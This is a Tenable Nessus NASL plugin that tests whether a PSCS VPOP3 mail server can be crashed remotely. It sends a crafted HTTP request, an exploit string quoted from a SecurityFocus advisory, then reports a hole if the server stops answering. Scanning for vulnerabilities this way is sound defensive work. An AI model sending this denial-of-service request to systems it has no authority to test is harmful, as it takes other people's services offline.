#
# (C) Tenable Network Security
#

if (description) {
  script_id(14232);
  script_bugtraq_id(10782);
  script_version ("$Revision: 1.5 $");

  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"8163");
  }

  name["english"] = "PSCS VPOP3 remote DoS";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running PSCS VPOP3.  The remote server
is vulnerable to an attack which renders the server useless.
An attacker, exploiting this flaw, would be able to remotely
shut down the server by sending a simple request.
 
Solution : Upgrade to latest version of VPOP3

See also : http://www.securityfocus.com/bid/10782 
 
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Attempt to DoS PSCS VPOP3";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) Tenable Network Security");
  family["english"] = "Denial of Service";
  script_family(english:family["english"]);

  script_require_ports("Services/www", 5108);
  script_dependencie('http_version.nasl');

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:5108);

if (!get_port_state(port)) 
	exit(0);


soc = http_open_socket(port);
if (! soc)
	exit(0);

# exploit string from http://www.securityfocus.com/bid/10782/exploit/
init = string("/messagelist.html?auth=MDA4MDA2MTQ6MTI3LjAuMC4xOmRpbWl0cmlz&msgliststart=0&msglistlen=10&sortfield=date&sortorder=A");

req = http_get(item:init, port:port);

send(socket:soc, data:req);
buf = http_recv(socket:soc);

http_close_socket(soc);

soc = http_open_socket(port);
if (! soc)
	security_hole(port);
